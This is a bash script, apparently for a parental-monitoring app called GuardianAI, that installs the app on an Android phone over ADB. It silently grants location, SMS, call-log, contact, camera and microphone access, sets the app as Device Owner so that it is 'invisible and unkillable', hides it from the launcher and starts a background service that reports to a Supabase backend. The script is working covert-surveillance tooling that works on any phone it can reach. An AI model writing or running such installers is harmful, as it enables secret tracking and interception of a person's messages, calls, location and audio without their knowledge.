#!/bin/bash
# ═══════════════════════════════════════════════════════════════
# GuardianAI — Silent Install & Permission Grant Script
# Run this ONCE from your Mac with phone connected via USB
# ═══════════════════════════════════════════════════════════════

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'

APK_PATH="${1:-app-debug.apk}"
PACKAGE="com.guardianai.agent"
ADMIN_RECEIVER=".receivers.GuardianAdminReceiver"

echo -e "${GREEN}═══════════════════════════════════════${NC}"
echo -e "${GREEN}  GuardianAI Silent Install Script${NC}"
echo -e "${GREEN}═══════════════════════════════════════${NC}\n"

# Check ADB
if ! command -v adb &> /dev/null; then
  echo -e "${RED}❌ ADB not found. Install Android Studio or Platform Tools first.${NC}"
  exit 1
fi

# Check device connected
DEVICE=$(adb devices | grep -v "List" | grep "device$" | head -1 | awk '{print $1}')
if [ -z "$DEVICE" ]; then
  echo -e "${RED}❌ No Android device found. Connect phone via USB and enable USB Debugging.${NC}"
  exit 1
fi
echo -e "${GREEN}✅ Device connected: $DEVICE${NC}\n"

# Install APK
echo -e "${YELLOW}📦 Installing APK...${NC}"
adb -s "$DEVICE" install -r -g "$APK_PATH"
if [ $? -ne 0 ]; then
  echo -e "${RED}❌ APK install failed.${NC}"; exit 1
fi
echo -e "${GREEN}✅ APK installed${NC}\n"

# Grant ALL permissions silently (Device Owner required for some)
echo -e "${YELLOW}🔑 Granting all permissions silently...${NC}"

PERMISSIONS=(
  "android.permission.ACCESS_FINE_LOCATION"
  "android.permission.ACCESS_COARSE_LOCATION"
  "android.permission.ACCESS_BACKGROUND_LOCATION"
  "android.permission.READ_CALL_LOG"
  "android.permission.READ_SMS"
  "android.permission.READ_CONTACTS"
  "android.permission.CAMERA"
  "android.permission.RECORD_AUDIO"
  "android.permission.READ_EXTERNAL_STORAGE"
  "android.permission.READ_MEDIA_IMAGES"
  "android.permission.WRITE_EXTERNAL_STORAGE"
)

for PERM in "${PERMISSIONS[@]}"; do
  adb -s "$DEVICE" shell pm grant "$PACKAGE" "$PERM" 2>/dev/null
  echo -e "  ${GREEN}✓${NC} $PERM"
done

# Grant Usage Stats (special permission)
echo -e "\n${YELLOW}📊 Granting Usage Stats access...${NC}"
adb -s "$DEVICE" shell appops set "$PACKAGE" GET_USAGE_STATS allow
echo -e "${GREEN}✅ Usage stats granted${NC}\n"

# Set as Device Owner (makes app invisible + unkillable)
echo -e "${YELLOW}👑 Setting Device Owner (requires NO Google account on device)...${NC}"
adb -s "$DEVICE" shell dpm set-device-owner "$PACKAGE/$ADMIN_RECEIVER" 2>&1
if [ $? -eq 0 ]; then
  echo -e "${GREEN}✅ Device Owner set — app is now INVISIBLE and UNKILLABLE${NC}\n"
else
  echo -e "${YELLOW}⚠️  Device Owner failed — phone may have Google account.${NC}"
  echo -e "${YELLOW}   Factory reset phone, skip Google account, then retry.${NC}\n"
fi

# Disable battery optimization
echo -e "${YELLOW}🔋 Disabling battery optimization...${NC}"
adb -s "$DEVICE" shell dumpsys deviceidle whitelist "+$PACKAGE" 2>/dev/null
echo -e "${GREEN}✅ Battery optimization disabled${NC}\n"

# Hide app from launcher (make completely invisible)
echo -e "${YELLOW}👻 Making app invisible to child...${NC}"
adb -s "$DEVICE" shell pm disable-user --user 0 "$PACKAGE/com.guardianai.agent.setup.SetupActivity" 2>/dev/null
echo -e "${GREEN}✅ App hidden from launcher${NC}\n"

# Start the service
echo -e "${YELLOW}🚀 Starting GuardianAI service...${NC}"
CHILD_ID="${2:-ENTER-CHILD-UUID-FROM-SUPABASE}"
adb -s "$DEVICE" shell am start-foreground-service \
  -n "$PACKAGE/.services.GuardianService" \
  --es child_id "$CHILD_ID" 2>/dev/null
echo -e "${GREEN}✅ Service started${NC}\n"

# Verify
echo -e "${YELLOW}🔍 Verifying installation...${NC}"
RUNNING=$(adb -s "$DEVICE" shell dumpsys activity services "$PACKAGE" | grep "ServiceRecord" | head -1)
if [ -n "$RUNNING" ]; then
  echo -e "${GREEN}✅ GuardianAI is RUNNING in background${NC}"
else
  echo -e "${YELLOW}⚠️  Service may not be running yet. Check Supabase for heartbeat.${NC}"
fi

echo -e "\n${GREEN}═══════════════════════════════════════${NC}"
echo -e "${GREEN}  Installation Complete! 🎉${NC}"
echo -e "${GREEN}═══════════════════════════════════════${NC}"
echo ""
echo "Next steps:"
echo "1. Open your Parent app to see the child device"
echo "2. Check Supabase → children table for 'is_online = true'"
echo "3. Disconnect USB — app runs silently forever"
echo ""
